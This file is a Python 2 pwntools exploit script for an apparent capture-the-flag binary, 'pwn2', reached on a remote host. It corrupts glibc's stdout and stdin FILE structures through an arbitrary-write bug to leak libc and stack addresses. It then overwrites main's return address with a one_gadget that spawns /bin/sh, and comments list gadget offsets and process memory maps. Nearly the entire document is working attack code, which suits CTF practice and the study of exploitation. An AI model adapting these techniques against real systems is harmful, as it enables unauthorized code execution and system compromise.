# coding:utf-8
#!/usr/bin/env python2
import copy
from ctypes import *
from pwn import *

libc = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
LOCAL = 0
if LOCAL:
    p = process('./pwn2')#,env={"LD_PRELOAD":"./libc-2.24.so"})
    elf = ELF('./pwn2')
    context.log_level = 'debug'
else:
    p = remote("bxsteam.xyz", 23333)#bxsteam.xyz 23333
#    context.log_level = 'debug'

def z(a=''):
	gdb.attach(p,a)
	if a == '':
		raw_input()

size = 0x400000
p.sendline(str(size - 0x1000))

libc_addr = copy.copy(libc)
libc_addr.address = size - 0x10

print 'libc_rel.symbols._IO_2_1_stdout_:' + hex(libc_addr.symbols._IO_2_1_stdout_)
print 'libc_rel.symbols.__malloc_hook:' + hex(libc_addr.symbols.__malloc_hook)
print 'libc_addr.symbols._IO_2_1_stdin_:' + hex(libc_addr.symbols._IO_2_1_stdin_)

p.sendline(str(libc_addr.symbols._IO_2_1_stdout_)+' '+chr(0x84 | 0x2))

p.sendline(str(libc_addr.symbols._IO_2_1_stdout_ + 1)+' '+chr(0x20 | 0x8 | 0x2))
p.sendline(str(libc_addr.symbols._IO_2_1_stdin_)+' '+chr(0x88 | 0x2))
data = p.clean(timeout=2)
p.sendline(str(libc_addr.symbols._IO_2_1_stdin_)+' '+chr(0x88))



p.sendline(str(libc_addr.symbols._IO_2_1_stdout_ + 0x10)+' '+chr(0x00)) # overwrites _IO_read_end
p.sendline(str(libc_addr.symbols._IO_2_1_stdout_ + 0x20)+' '+chr(0x00)) # overwrites _IO_write_base

p.sendline(str(libc_addr.symbols._IO_2_1_stdout_ + 1)+' '+chr(0x20 | 0x8 | 0x2))
p.sendline(str(libc_addr.symbols._IO_2_1_stdin_)+' '+chr(0x88 | 0x2))
data = p.clean(timeout=2)
p.sendline(str(libc_addr.symbols._IO_2_1_stdin_)+' '+chr(0x88))

print data[24:30]
info("leaked address: %#x", u64(data[24:32]))
libc.address += u64(data[24:32]) - libc.symbols._IO_file_jumps
libc_base_my = libc.address
alloc_base = libc.address - size # address of our mmaped heap block
success("libc base: %#x, alloc_base: %#x", libc.address, alloc_base)

def write_rel(offset, data):
    offset = c_uint64(offset).value
    for i, b in enumerate(data):
        p.sendline(str(offset + i)+' '+b)

def write_abs(address, data):
    offset = address - (alloc_base + 0x10) # +0x10 to account for the malloc chunk header
    print 'offset:'+hex(offset)
#    print 'data:'+hex(data)
    write_rel(offset, data)

print 'libc.symbols.program_invocation_name:' + hex(libc.symbols.program_invocation_name)

def flush_stdout():
    write_rel(libc_addr.symbols._IO_2_1_stdout_ + 1, p8(0x20 | 0x8 | 0x2))
    write_rel(libc_addr.symbols._IO_2_1_stdin_, p8(0x88 | 0x2))
    data = p.clean(timeout=2)
    write_rel(libc_addr.symbols._IO_2_1_stdin_, p8(0x88))
    return data

addr = libc.symbols.program_invocation_name
@MemLeak
def leak(addr):
    write_abs(libc.symbols._IO_2_1_stdout_ + 0x10, p64(addr)) # _IO_read_end
    write_abs(libc.symbols._IO_2_1_stdout_ + 0x20, p64(addr)) # _IO_write_base
    write_abs(libc.symbols._IO_2_1_stdout_ + 0x28, p64(addr + 0x2000)) # _IO_write_ptr
    return flush_stdout()

stack_ptr = leak.u64(libc.symbols.program_invocation_name)
#info("stack ptr: %#x" % stack_ptr)


main_ret = libc.symbols.__libc_start_main + 0xF0

base = stack_ptr - 0x2000
stack = leak.n(base, 0x2000)
ret_location = base + stack.find(p64(main_ret))
success("found main return address: %#x", ret_location)

# rop = ROP(libc)
# rop.call("execv", [next(libc.search("/bin/sh\0")), 0])

write_abs(ret_location, p64(libc_base_my+0x45216))
print 'one_gadget:' + hex(libc_base_my+0x45216)

#p.sendline("x")
p.interactive()



# 0x45216	execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a	execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf0274	execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1117	execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL




#z()
    # Arch:     amd64-64-little
    # RELRO:    Full RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      PIE enabled

#0x00007ffdfccc1128

#0x5599ed8b1020

# gef➤  info proc mappings
# process 5364
# # Mapped address spaces:
# process 4271
# Mapped address spaces:

#           Start Addr           End Addr       Size     Offset objfile
#       0x555555554000     0x555555555000     0x1000        0x0 /home/moonagirl/moonagirl/ida/pwn2
#       0x555555754000     0x555555755000     0x1000        0x0 /home/moonagirl/moonagirl/ida/pwn2
#       0x555555755000     0x555555756000     0x1000     0x1000 /home/moonagirl/moonagirl/ida/pwn2
#       0x555555756000     0x555555777000    0x21000        0x0 [heap]
#       0x7ffff760c000     0x7ffff7a0d000   0x401000        0x0 
#       0x7ffff7a0d000     0x7ffff7bcd000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
#       0x7ffff7bcd000     0x7ffff7dcd000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
#       0x7ffff7dcd000     0x7ffff7dd1000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
#       0x7ffff7dd1000     0x7ffff7dd3000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
#       0x7ffff7dd3000     0x7ffff7dd7000     0x4000        0x0 
#       0x7ffff7dd7000     0x7ffff7dfd000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
#       0x7ffff7fd8000     0x7ffff7fdb000     0x3000        0x0 
#       0x7ffff7ff7000     0x7ffff7ffa000     0x3000        0x0 [vvar]
#       0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
#       0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
#       0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
#       0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
#       0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
#   0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]

